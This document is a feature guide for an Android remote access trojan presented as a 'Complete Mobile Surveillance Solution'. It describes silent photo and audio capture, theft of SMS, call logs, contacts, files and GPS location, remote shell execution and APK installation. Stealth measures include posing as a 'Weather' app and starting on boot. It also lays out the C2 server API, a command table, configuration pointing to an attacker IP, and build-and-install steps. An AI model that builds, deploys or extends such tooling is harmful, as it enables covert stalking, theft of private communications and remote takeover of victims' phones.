# Android RAT Features

## 🎯 Core Features

### 1. Camera Access 📷
- **Take Photos**: Capture images silently from front/rear camera
- **Photo Upload**: Automatically uploads to C2 server
- **No Flash**: Photos taken without flash to avoid detection
- **Storage**: Photos saved locally and uploaded

### 2. Call Logs 📞
- **Incoming Calls**: Number, name, date, duration
- **Outgoing Calls**: All dialed numbers
- **Missed Calls**: Track missed calls
- **Last 50 Calls**: Retrieves recent call history

### 3. File System Access 📁
- **Browse Files**: Navigate device storage
- **List Directories**: View folder contents
- **Download Files**: Pull any file from device
- **File Metadata**: Size, modified date, type

### 4. GPS Location 📍
- **GPS Tracking**: Precise location via GPS
- **Network Location**: Fallback to network-based
- **Real-time**: Location on demand
- **History**: Track movement over time

### 5. SMS Messages 📨
- **Read SMS**: Access inbox messages
- **Send SMS**: Send messages silently
- **Message Details**: Number, body, date, type
- **Last 50 SMS**: Recent messages

### 6. Contacts 👥
- **Contact List**: All saved contacts
- **Phone Numbers**: Associated numbers
- **Contact Names**: Display names
- **Export**: Download full contact list

### 7. Audio Recording 🎤
- **Record Audio**: Capture ambient sound
- **Configurable Duration**: Set recording length
- **WAV Format**: High-quality audio
- **Background**: Records silently

### 8. Device Information ℹ️
- **Model**: Device model and manufacturer
- **Android Version**: OS version
- **IMEI/IMSI**: Unique device identifiers
- **MAC Address**: Network interface
- **IP Address**: Current IP

### 9. Shell Commands 🔧
- **Root Access**: Execute shell commands (if rooted)
- **Remote Execution**: Run any command
- **Output Capture**: Get command output

---

## 🛡️ Stealth Features

### Hidden Operation
- **Disguised Name**: Shows as "Weather" app
- **Minimal Notification**: Low-priority notification
- **Hidden from Recents**: Not in recent apps
- **Auto-start**: Launches on boot

### Background Service
- **Foreground Service**: Runs persistently
- **Heartbeat**: Regular check-ins (30s default)
- **Command Polling**: Checks for new commands
- **Auto-reconnect**: Reconnects on network change

---

## 📊 C2 Server Features

### Web Dashboard
- **Device List**: All connected devices
- **Online Status**: Real-time device status
- **Command Interface**: Send commands via web UI
- **Data Viewer**: View all collected data

### API Endpoints
```
POST /api/heartbeat          - Device check-in
GET  /api/commands/<id>      - Get pending commands
POST /api/command            - Send command
POST /api/photo              - Receive photo notification
POST /api/upload/photo/<id>  - Upload photo
POST /api/call_logs          - Receive call logs
POST /api/files              - Receive file listing
POST /api/upload/file/<id>   - Upload file
POST /api/location           - Receive location
POST /api/sms                - Receive SMS
POST /api/contacts           - Receive contacts
POST /api/audio              - Receive audio notification
POST /api/upload/audio/<id>  - Upload audio
GET  /api/devices            - List all devices
GET  /api/device/<id>        - Get device data
GET  /api/download/<type>/<id>/<file>
```

### Data Storage
```
uploads/
├── photos/
│   └── <device_id>/
│       ├── photo_1234567890.jpg
│       └── photo_1234567891.jpg
├── audio/
│   └── <device_id>/
│       └── audio_1234567890.wav
└── files/
    └── <device_id>/
        └── downloaded_file.pdf
```

---

## 🎮 Command Reference

| Command | Parameter | Description |
|---------|-----------|-------------|
| `camera` | - | Take a photo |
| `camera_video` | - | Record video |
| `call_logs` | - | Get call history |
| `files` | `/path` | List directory contents |
| `download` | `/path/to/file` | Download specific file |
| `location` | - | Get GPS location |
| `sms` | - | Read SMS messages |
| `sms_send` | `number,message` | Send SMS |
| `contacts` | - | Get contact list |
| `audio` | `duration` | Record audio (seconds) |
| `info` | - | Get device info |
| `shell` | `command` | Execute shell command |
| `install` | `url` | Install APK from URL |
| `uninstall` | `package` | Uninstall app |

---

## 📱 Supported Android Versions

- **Minimum**: Android 5.0 (API 21)
- **Recommended**: Android 8.0+ (API 26+)
- **Tested**: Android 10, 11, 12, 13, 14

---

## 🔧 Configuration

### MainActivity.java
```java
// C2 Server URL
private static final String SERVER_URL = "http://YOUR_IP:5000";

// Heartbeat interval (milliseconds)
private static final int CHECK_INTERVAL = 30000;  // 30 seconds

// App disguise name
private static final String APP_NAME = "Weather";
```

### AndroidManifest.xml
- Package name: `com.androidrat`
- Application ID: `com.weather.app` (disguise)
- All permissions declared

---

## 🚀 Quick Start

```bash
# 1. Install dependencies
pip3 install flask flask-cors --break-system-packages

# 2. Start server
python3 server.py

# 3. Build APK (requires Android Studio)
./gradlew assembleRelease

# 4. Install on device
adb install app/build/outputs/apk/release/app-release.apk

# 5. Access dashboard
http://localhost:5000
```

---

## 📈 Statistics Dashboard

The web dashboard shows:
- Total connected devices
- Online/offline status
- Photos collected
- Audio files recorded
- Recent activity log
- Device details

---

*Android RAT - Complete Mobile Surveillance Solution*
